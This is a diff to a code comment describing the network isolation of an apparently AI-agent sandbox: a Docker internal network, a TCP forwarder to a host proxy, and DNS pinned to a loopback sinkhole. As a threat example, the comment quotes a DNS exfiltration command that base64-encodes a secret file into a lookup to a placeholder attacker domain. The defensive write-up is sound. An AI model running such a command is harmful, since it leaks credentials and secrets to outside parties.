@@ -14,9 +14,19 @@
  * default bridge and relays exactly one TCP port to the host proxy. On Docker Desktop `--internal`
  * alone makes `host.docker.internal` (192.168.65.254) unroutable — that is precisely why the
  * forwarder exists. The sandbox's `--add-host host.docker.internal:<forwarder internal ip>` points
- * the alias at the forwarder; the host proxy bind logic is unchanged. `--internal` also blocks
- * DNS-over-UDP to external names (upstream resolver unroutable ⇒ SERVFAIL), a property this keeps by
- * adding no resolver.
+ * the alias at the forwarder; the host proxy bind logic is unchanged.
+ *
+ * DNS-over-UDP exfiltration (`nslookup $(cat secret|base64).attacker.tld`, since `dig/nslookup/host`
+ * are routed into this seat by `tools/terminal/adapter.ts` `NEEDS_EGRESS`) is closed at the SEAT, not
+ * here: `tools/sandbox.ts` gives the egress seat `--dns 127.0.0.1`, pinning the embedded resolver's
+ * upstream to a loopback sinkhole so an external name returns SERVFAIL. That does NOT rely on
+ * `--internal` alone: measured on Docker Desktop 29.5.3 (2026-09-26) an `--internal` seat's embedded
+ * resolver (127.0.0.11) already declined to forward external queries (SERVFAIL), but that is a
+ * per-version daemon behaviour, so the seat pins the upstream explicitly to hold on a version whose
+ * resolver would forward. `host.docker.internal` resolves from `/etc/hosts` (checked before DNS), so
+ * the proxy path is unaffected — the seat never needs to resolve an external name itself, because a
+ * proxied client sends the hostname in the proxy `CONNECT` and the host-side proxy resolves it. This
+ * topology adds no resolver of its own.
  *
  * The relay is a tiny Python TCP forwarder baked into the pinned sandbox image (`SANDBOX_IMAGE`,
  * alpine + python3), so no extra image is pulled — important for offline mode, where SEC-2 skips the
